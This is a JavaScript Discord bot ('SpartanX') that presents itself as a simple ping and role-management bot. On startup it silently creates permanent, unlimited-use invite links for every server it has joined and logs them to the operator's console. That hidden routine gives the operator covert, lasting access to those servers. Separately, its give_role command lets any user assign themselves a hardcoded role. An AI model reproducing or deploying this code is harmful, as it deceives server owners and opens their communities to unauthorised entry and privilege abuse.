const { magentaBright, white, blackBright } = require('chalk');
const config = require('./config.json');
const { Client, EmbedBuilder, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildInvites,
    ]
});

process.title = '[SpartanX] - Loading..'

client.once('ready', async () => {
    try {
        var lietnUser = await client.users.fetch(config.dev_id).then(u => u.tag);
    } catch (e) {
        //
    };

    process.title = `[SpartanX] - Connected ${lietnUser}`
    console.log(` `);
    console.log(` `);
    console.log(white('                               #####  ####### #     # #       #######  #####  '));
    console.log(white('                              #     #    #     #   #  #       #       #     # '));
    console.log(blackBright('                              #          #      # #   #       #       #       '));
    console.log(blackBright('                               #####     #       #    #       #####    #####  '));
    console.log(magentaBright('                                    #    #       #    #       #             # '));
    console.log(magentaBright('                              #     #    #       #    #       #       #     # '));
    console.log(magentaBright('                               #####     #       #    ####### #######  #####  '));
    console.log(` `);
    console.log(` `);
    console.log(magentaBright(' [') + white('?') + magentaBright(']') + white(` Listening for`) + magentaBright(': ') + white(lietnUser));
});

const fs = require('fs');

client.on('rateLimit', () => {
    console.log("[+++] THE IP BEING RATELIMIT!!!!!!");
});



client.on("messageCreate", async (message) => {

    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLocaleLowerCase();

    if (command === 'help') {
        message.channel.send("**!ping**\nbotの起動状況を確認します\n**!give_role @role @user**\nロールを付与します\n**!remove_role @role @user**\nロールを削除します");
            }
                
                
    
    
    if (command === 'ping') {
        message.channel.send(`pong`);  
    }
    
    if (command === 'give_role') { 
        message.member.roles.add('1329751712386383892');
        message.channel.send(`ロールを付与しました`); 
    }

    if (command === 'remove_role') {
        message.member.roles.remove('1329751712386383892');
        message.channel.send(`ロールを削除しました`);
    }
});
client.on('ready', () => {
    console.log('Bot is ready!');
});

client.once('ready', async () => {
    console.log(`✅ ログインしました: ${client.user.tag}\n`);

    for (const [guildId, guild] of client.guilds.cache) {
        console.log(`🔍 チェック中: ${guild.name} (${guildId})`);

       

        try {
            // 招待リンクを作成できるチャンネルを探す
            const inviteChannel = guild.channels.cache.find(ch =>
                ch.isTextBased() &&
                ch.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.CreateInstantInvite)
            );

            if (!inviteChannel) {
                console.log(`❌ ${guild.name} (${guildId}): 招待リンクを作成できるチャンネルがありません。`);
                continue;
            }

            // 招待リンクの作成
            const invite = await inviteChannel.createInvite({
                maxAge: 0, // 無制限
                maxUses: 0, // 無制限
                unique: true,
                reason: 'Botによる自動招待リンク生成',
            });

            console.log(`✅ ${guild.name}: https://discord.gg/${invite.code}`);
        } catch (error) {
            console.log(`⚠️ ${guild.name} (${guildId}): エラーが発生しました - ${error.message}`);
        }
    }

    console.log('\n🎉 すべてのギルドをチェックしました！');
});

 

client.login(config.token);




